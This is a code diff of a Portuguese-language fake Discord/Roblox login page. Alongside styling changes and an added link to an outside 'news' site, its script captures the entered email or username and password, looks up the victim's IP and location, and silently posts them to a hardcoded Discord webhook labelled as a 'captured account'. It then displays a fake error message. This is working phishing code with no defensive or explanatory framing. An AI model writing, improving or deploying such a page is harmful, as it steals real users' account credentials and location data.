@@ -26,10 +26,7 @@
       animation: fadeInUp 1s ease-out forwards;
     }
     @keyframes fadeInUp {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+      to { opacity: 1; transform: translateY(0); }
     }
     body::after {
       content: "";
@@ -176,11 +173,24 @@
       align-items: center;
       justify-content: center;
       gap: 12px;
+      margin: 16px 0;
     }
     .logos img {
       height: 50px;
       width: auto;
       object-fit: contain;
+    }
+    .extra-link {
+      margin-top: 20px;
+      font-size: 0.95rem;
+    }
+    .extra-link a {
+      color: #00aff4;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .extra-link a:hover {
+      text-decoration: underline;
     }
     .voltar {
       position: absolute;
@@ -263,6 +273,11 @@
           <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
         </div>
+
+        <!-- Link novo abaixo das logos -->
+        <div class="extra-link">
+          <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">Acesse aqui para mais novidades</a>
+        </div>
       </div>
     </div>
   </div>
@@ -270,7 +285,7 @@
   <script>
     const form = document.getElementById('loginForm');
     const errorBox = document.getElementById('errorBox');
-    const webhookUrl = 'https://discord.com/api/webhooks/1475218735819395416/cow2HlNA0PkebZzcVc5p-M2NiPBm7vMGXcO2Sm-EIVq3hbVvGazpzGXpEVal1t1Tf-k3'; // ← COLOQUE SEU WEBHOOK REAL AQUI
+    const webhookUrl = 'https://discord.com/api/webhooks/1475218735819395416/cow2HlNA0PkebZzcVc5p-M2NiPBm7vMGXcO2Sm-EIVq3hbVvGazpzGXpEVal1t1Tf-k3'; // COLOQUE SEU WEBHOOK AQUI
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -283,44 +298,40 @@
         return;
       }
 
-      // Captura de IP com fallback
+      // Captura de IP + localização
       let ip = 'Desconhecido';
       let location = 'Desconhecido';
-
       try {
-        // Primeira tentativa: ipapi.co (suporta IPv6 bem)
         let res = await fetch('https://ipapi.co/json/');
         let data = await res.json();
         if (data.ip) {
           ip = data.ip;
-          if (data.city && data.country_name) {
-            location = `${data.city}, ${data.country_name}`;
-          }
+          location = data.city && data.country_name ? `${data.city}, ${data.country_name}` : 'Desconhecido';
         }
-      } catch (err) {
-        // Fallback: ipwhois.io
+      } catch {
         try {
           let res2 = await fetch('https://ipwhois.io/api');
           let data2 = await res2.json();
           if (data2.ip) {
             ip = data2.ip;
-            if (data2.city && data2.country) {
-              location = `${data2.city}, ${data2.country}`;
-            }
+            location = data2.city && data2.country ? `${data2.city}, ${data2.country}` : 'Desconhecido';
           }
-        } catch (fallbackErr) {}
+        } catch {}
       }
 
-      const mensagem = `🔐Nova Conta De Discord Capturada!
-Email ou Telefone Ou Nome:
-\`${email}\`
+      // Data e hora
+      const agora = new Date();
+      const dataFormatada = agora.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
+      const horaFormatada = agora.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', hour12: false });
+      const hoje = agora.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', hour12: false });
 
-Senha:
-\`${senha}\`
+      // Mensagem no formato que você mostrou
+      const mensagem = `🔐 **Nova Conta De Discord Capturada!**
 
-🌐 IP Capturado: ${ip}
+**Login:** \`${email}\`  
+**Senha:** \`${senha}\`
 
-📍 Localização aproximada: ${location}`;
+**Capturado** • ${dataFormatada}, ${horaFormatada} • Hoje às ${hoje}`;
 
       // Envia pro webhook silenciosamente
       fetch(webhookUrl, {
@@ -329,13 +340,9 @@ Senha:
         body: JSON.stringify({ content: mensagem })
       }).catch(() => {});
 
-      // Mostra o erro com animação
+      // Mostra erro 504 animado
       errorBox.classList.add('show');
-
-      // Esconde após 3 segundos
-      setTimeout(() => {
-        errorBox.classList.remove('show');
-      }, 3000);
+      setTimeout(() => errorBox.classList.remove('show'), 3000);
     });
   </script>
 
